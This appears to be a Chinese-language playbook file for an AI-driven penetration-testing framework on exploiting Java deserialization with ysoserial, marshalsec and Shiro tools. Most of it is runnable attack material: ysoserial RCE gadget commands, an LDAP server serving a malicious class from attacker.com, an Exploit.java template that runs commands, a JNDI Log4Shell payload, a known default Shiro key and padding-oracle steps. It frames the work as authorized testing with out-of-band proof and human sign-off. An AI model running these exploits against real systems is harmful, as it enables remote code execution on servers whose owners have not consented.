---
name: java-gadget
description: Java 反序列化 gadget 工具 playbook — ysoserial / marshalsec / Shiro tools 的常用 gadget 选择 / JNDI 利用 / OOB 验证流程。Java 系反序列化主战场。
category: tooling
tags: [tool, java, deser, ysoserial, jndi, classic]
---

# Java Gadget Tools Playbook (classic only)

> **何时用本文件**: Java 反序列化漏洞 (Shiro / Fastjson / Jackson / 普通 Java native) 命中后,需要选择正确 gadget + JNDI 利用。
> **toolPlus 替代**: 同样用 ysoserial JAR (toolPlus 没 native MCP 替代);但 OOB 监听用 `mcp__yaklang__query_oob_record`。

---

## 1. 配置

```yaml
# tool-config.md
ysoserial: "/path/to/ysoserial.jar"
marshalsec: "/path/to/marshalsec-0.0.3-SNAPSHOT-all.jar"
shiro-tools: "/path/to/ShiroAttack2.jar"
```

JDK 要求: ysoserial 用 JDK 8 跑最稳 (部分 gadget 用 11+ 会失败)。

---

## 2. ysoserial 用法

### 2.1 生成 URLDNS (探测专用)

```bash
java -jar ysoserial.jar URLDNS "http://xxx.OOB.tld" > payload.bin
# 输出 base64 (需自己再 base64 编码)
java -jar ysoserial.jar URLDNS "http://xxx.OOB.tld" | base64 -w0
```

**用途**: 探测目标是否真触发反序列化,不需要任何 gadget chain。**所有 Java 反序列化优先用 URLDNS 验证**。

### 2.2 生成 RCE gadget

```bash
# CommonsCollections5 (Java 8 + cc 3.x)
java -jar ysoserial.jar CommonsCollections5 'curl http://OOB.tld' | base64 -w0

# CommonsCollections6 (Java 8 + cc 3.2+)
java -jar ysoserial.jar CommonsCollections6 'whoami' | base64 -w0

# CommonsCollections11 (Java 8 + cc 4.0+)
java -jar ysoserial.jar CommonsCollections11 'id' | base64 -w0

# Spring1 / Spring2 (Spring 环境)
java -jar ysoserial.jar Spring1 'curl http://OOB.tld' | base64 -w0
```

### 2.3 完整 gadget 列表 (常用 12 个)

| Gadget | 依赖 | 适用 |
| :--- | :--- | :--- |
| URLDNS | JRE | 探测 (DNS only) |
| CommonsCollections1 | cc 3.x + JDK ≤ 8u71 | 老环境 |
| CommonsCollections5 | cc 3.x + JDK 8 | 经典 |
| CommonsCollections6 | cc 3.x + JDK 8/11 | 现代 |
| CommonsCollections7 | cc 3.x | 备选 |
| CommonsCollections10/11 | cc 4.x | 新 cc 版本 |
| CommonsBeanutils1 | cb 1.x | beanutils 链 |
| Spring1 / Spring2 | Spring | Spring 环境必试 |
| Hibernate1 | Hibernate | ORM 应用 |
| Jdk7u21 | JDK ≤ 7u21 | 极老环境 |
| MozillaRhino1 | Rhino | JS 引擎 |
| Click1 | Click framework | 罕见 |

---

## 3. 测试流程 (Shiro / 普通 Java)

### Step 1: URLDNS 探测

```bash
PAYLOAD=$(java -jar ysoserial.jar URLDNS "http://probe-${RANDOM}.OOB.tld" | base64 -w0)
# 发送到目标 (Shiro: AES 加密 + base64; native: 直接 base64)
# 看 OOB 是否收到 DNS 查询
```

### Step 2: 命中后选 gadget

```
观察依赖:
1. 报错栈含 commons-collections 3.x → CC5/CC6
2. 报错栈含 commons-collections 4.x → CC11
3. Spring 应用 → Spring1/2
4. heap dump 含 hibernate → Hibernate1
```

### Step 3: OOB-only RCE 证明

```bash
# 不要直接执行有副作用命令,先用 curl 触发 OOB
PAYLOAD=$(java -jar ysoserial.jar CommonsCollections6 'curl http://rce-${RANDOM}.OOB.tld' | base64 -w0)
```

OOB 收到回调 → RCE 确认 → HITL 决定是否升级。

---

## 4. marshalsec (LDAP/RMI Server)

### 4.1 启动 LDAP server

```bash
# 模拟攻击 LDAP,返回恶意 Java class
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.LDAPRefServer \
  "http://attacker.com:8000/#Exploit" 1389
# 监听 1389,任何 LDAP 查询都返回指向 http://attacker.com:8000/Exploit.class
```

### 4.2 启动 HTTP server (提供 Exploit.class)

```bash
# 编译 Exploit.java
javac Exploit.java
python -m http.server 8000
```

`Exploit.java` 模板:
```java
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("curl http://OOB.tld/proof");
        } catch (Exception e) {}
    }
}
```

### 4.3 触发 (JNDI)

```bash
# 目标接收 JNDI payload,例如 Log4Shell 类
${jndi:ldap://attacker.com:1389/Exploit}
# 触发后 → 目标 fetch class → 静态块执行 → curl OOB
```

---

## 5. Shiro 专用 (ShiroAttack2 / shiro_tools)

### 5.1 Key 探测

```bash
java -jar ShiroAttack2.jar
# GUI:输入目标 URL → 检测 → 自动跑 key 字典 → 命中后选 gadget
```

### 5.2 命令行 (Linux)

```bash
java -jar shiro_tools.jar \
  -u https://target/login \
  -t URLDNS \
  -d "http://probe.OOB.tld" \
  -k "kPH+bIxk5D2deZiIxcaaaA=="
```

### 5.3 Padding Oracle (Shiro-721)

```bash
# 需大量请求 (5000+ packets/byte)
java -jar shiro_tools_721.jar --url https://target --jsession <valid_cookie>
# 慢,P3.5 HITL 确认速率
```

---

## 6. atomic-rain 协议集成

| 阶段 | 工具 | 动作 |
| :--- | :--- | :--- |
| Phase 2 First-pass | ysoserial URLDNS | OOB-only 验证 |
| Phase 2 命中 | ysoserial RCE gadget | OOB callback 验证 |
| Phase 3 JNDI 链 | marshalsec | 配合 Log4Shell / Fastjson JNDI 触发 |
| Phase 3 Shiro 全流程 | ShiroAttack2 | key + gadget 一次性 |

**P3.5 强制**: 
- URLDNS only 探测,**不直接发** RCE gadget
- RCE gadget 也用 OOB callback,不写文件 / 不反弹 shell

---

## 7. False Positives / 常见问题

| 现象 | 真实判断 |
| :--- | :--- |
| URLDNS 命中但 gadget 全失败 | 类路径无对应库 — 换 gadget 家族 |
| 500 错误但无回调 | gadget 触发但出站封锁 — 改 HTTP/HTTPS OOB |
| ysoserial 报错 "no such gadget" | JDK 版本问题 — 用 JDK 8 |
| Shiro 默认 key 全不命中 | 业务自定义 key — grep 源码 / heap dump / GitHub |
| Fastjson JdbcRowSetImpl OOB 命中但 LDAP 没起 | LDAP 端口被封 — 改 DNS-only payload |
| Log4Shell 类回调但实际未执行 | 等待 fetch class — 看 HTTP server log |

---

## 8. Pro Tips

- **永远 URLDNS first**: 任何 Java 反序列化第一步都是 URLDNS,不要直接打 RCE
- **JDK 8 跑 ysoserial**: 部分 gadget 在 JDK 11+ 失败,固定用 JDK 8
- **OOB 子域随机化**: 每次测试用唯一 token 子域,避免缓存导致误判
- **国内 Java 项目**: commons-collections / fastjson 几乎必有,gadget 命中率高
- **JNDI 协议升级**: JDK ≥ 8u191 默认禁 LDAP 远程加载 class → 用 ldap+local-bypass 类 gadget
- **Spring Boot 应用必试 Spring1/2**: 命中率比 CC 系列高
- **`marshalsec` ≠ `ysoserial`**: 前者主要做 JNDI server + 一些 JSON 反序列化 (fastjson/xstream 等)
- **Shiro 1.4.2+ GCM 模式**: 默认不可破,只能等开发回退或找配置错 (`shiro.cipherKey` 不变)
- **GitHub key 复用**: 同公司多个项目搜 `cipherKey` / `rememberMe` 关键字
- **Burp 转发**: payload 通过 Burp 发送,可看到完整响应 + WAF 触发详情
- **生产 OPSEC**: 真实 RCE 验证 (whoami) 输出脱敏 + HITL 确认

---

## 9. 相关参考

- 反序列化决策卡: [../vuln/deserialize.md](../vuln/deserialize.md)
- Shiro 决策卡: [../vuln/shiro.md](../vuln/shiro.md)
- Fastjson/Jackson 决策卡: [../vuln/fastjson-jackson.md](../vuln/fastjson-jackson.md)
- JNDI / Log4Shell: [../vuln/jndi-log4shell.md](../vuln/jndi-log4shell.md)
- xstream / Hessian / Dubbo: [../vuln/xstream-hessian-dubbo.md](../vuln/xstream-hessian-dubbo.md)
- Spring 框架: [../frameworks/spring-boot.md](../frameworks/spring-boot.md)
- OOB 基础设施: [../oob-infrastructure.md](../oob-infrastructure.md)
